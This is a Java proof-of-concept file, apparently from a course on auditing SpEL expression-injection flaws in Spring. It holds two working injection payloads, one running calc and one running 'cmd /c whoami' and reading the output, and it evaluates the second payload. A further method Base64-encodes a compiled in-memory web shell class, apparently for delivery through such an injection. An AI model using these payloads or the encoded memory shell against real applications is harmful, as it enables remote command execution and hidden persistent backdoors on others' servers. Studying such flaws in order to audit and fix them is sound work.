package com.example.speldemo.test;

import cn.hutool.core.codec.Base64;
import cn.hutool.core.io.file.FileReader;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.ParserContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class Poc {



    public static void testPoc(){

        String payload1 = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";


        String payload2 = "new java.util.Scanner(new java.lang.ProcessBuilder(\"cmd\", \"/c\", \"whoami\").start().getInputStream(), \"GBK\").useDelimiter(\"xxx\").next()";
        ExpressionParser parser = new SpelExpressionParser();
        // StandardEvaluationContext context = new StandardEvaluationContext("");
        Expression expression = parser.parseExpression(payload2);
        System.out.println(expression.getValue());


    }

    public static void base64(){

        FileReader fileReader = new FileReader("F:\\JAVA代码审计\\JAVA WEB代码审计\\8、SpEL表达式注入漏洞代码审计\\代码\\SpELdemo\\target\\classes\\InceptorMemShell.class");
        byte[] bytes = fileReader.readBytes();
        String encode = Base64.encode(bytes);
        System.out.println(encode);

    }



    public static void main(String[] args) {
        base64();
    }
}
